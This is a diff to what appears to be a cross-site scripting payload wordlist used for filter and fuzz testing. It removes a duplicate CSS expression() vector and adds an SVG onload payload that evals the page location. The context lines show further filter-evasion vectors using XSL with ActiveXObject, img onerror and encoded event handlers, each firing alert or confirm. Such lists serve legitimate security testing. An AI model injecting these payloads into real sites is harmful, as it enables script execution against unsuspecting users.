@@ -1201,7 +1201,6 @@ x="<%";
 <?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
 <?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>
 <?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
-<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
 <?xml-stylesheet type="text/xsl" href="#" ?><stylesheet xmlns="http://www.w3.org/TR/WD-xsl"><template match="/"><eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval><if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if></template></stylesheet>
 <?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
 <xmp><img alt="</xmp><img src=xx:x onerror=confirm(1)//">
@@ -1216,3 +1215,4 @@ xss--><!--<script>xss
 x”</title><img src%3dx onerror%3dconfirm(1)>
 <%/z=%&gt&lt;p/&#111;nresize&#x3d;alert(1)//>
 <%/z=%&gt&lt;p/onresize=alert(1)//>
+<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}
